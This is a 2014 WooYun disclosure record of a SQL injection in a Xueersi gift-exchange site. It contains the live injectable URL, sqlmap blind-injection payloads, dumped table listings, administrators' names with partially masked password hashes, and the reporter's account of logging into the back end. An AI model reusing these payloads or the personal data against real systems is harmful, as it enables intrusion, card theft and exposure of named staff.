{"id": 498, "wybug_id": "wooyun-2014-075420", "wybug_title": "学而思某礼品兑换系统SQL注入漏洞可获取后台权限和大量礼品卡号码", "wybug_corp": "好未来集团学而思培优", "wybug_author": "Coffee", "wybug_date": "2014-09-08 11:01", "wybug_open_date": "2014-10-23 11:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-23：\t细节向公众公开  简要描述： 学而思某礼品兑换系统SQL注入漏洞可获取后台权限和大量礼品卡号码（有各种各样的礼物~~~） 详细说明：  注入点：http://jifen.jiajiaoban.com/students/giftDetail/51* (GET)back-end DBMS: MySQL 5.0.11available databases [3]:[*] information_schema[*] test[*] zkshopsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://jifen.jiajiaoban.com:80/students/giftDetail/51' AND 6414=6414 AND 'ViPL'='ViPL    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: http://jifen.jiajiaoban.com:80/students/giftDetail/51' AND SLEEP(5) AND 'iKaa'='iKaa---back-end DBMS: MySQL 5.0.11Database: zkshop[24 tables]+-----------------------------+| admins                      || advertises                  || areas                       || batchs                      || cards                       || categories                  || enter_stock_details         || enter_stocks                || exchanges                   || focuses                     || gifts                       || giftvotes                   || groups                      || leave_stock_details         || leave_stocks                || points_login_log            || receivelimits               || recharges                   || school_leave_stock_details  || school_leave_stocks         || service_leave_stock_details || tb_student_temp             || users                       || userscores                  |+-----------------------------+学生信息：+-------+---------+| Table | Entries |+-------+---------+| users | 40488   |+-------+---------+大量礼品卡（60多万张卡真恐怖……）：back-end DBMS: MySQL 5.0.11Database: zkshopTable: cards[4 columns]+----------+---------------------+| Column   | Type                |+----------+---------------------+| batch_id | int(6) unsigned     || cardnum  | char(15)            || id       | int(11) unsigned    || is_valid | tinyint(1) unsigned |+----------+---------------------++-------+---------+| Table | Entries |+-------+---------+| cards | 6366313 |+-------+---------+部分管理员：back-end DBMS: MySQL 5.0.11Database: zkshopTable: admins[15 entries]+----------+----------------------------------+--------------+| username | password                         | loginname    |+----------+----------------------------------+--------------+| 孙勤兴      | 0be062马赛克6aa8e | sunqinxing   || 李晓丹      | 1e6df马赛克30d3 | lixiaodan    || 郭某       | 202cb96马赛克234b70 | 海淀黄庄校区       || 陈某       | 202cb962马赛克34b70 | 人大服务中心       || 唐巍       | 202cb962马赛克234b70 | tangwei      || 阜成门      | 21218cc马赛克51105 | fuchengmen   |基本都是比较弱的口令，解起来非常轻松。由于管理员太多，实在懒得等到跑出admin，就随便拿个号登录后台了。admin应该权限更大。\n\n   漏洞证明：  back-end DBMS: MySQL 5.0.11Database: zkshop+--------+---------+| Table  | Entries |+--------+---------+| admins | 115     |+--------+---------+   修复方案：  #1、过滤参数   版权声明：转载请注明来源 Coffee@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-09-09 09:20 厂商回复： 感谢支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-08 22:00 |    \t\t龙行天下 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:9        | coder一枚！)\t\t \n  你跟学而思干上了，可以考虑下其他互联网行业，不要总搞软柿子！hah     \n     2014-09-09 07:19 |    \t\tCoffee \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:15        | Corie, a student of RDFZ.)\t\t \n  @龙行天下 其实我还有一个学而思的洞在审核……其他那些大厂商没兴趣+没水平……    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}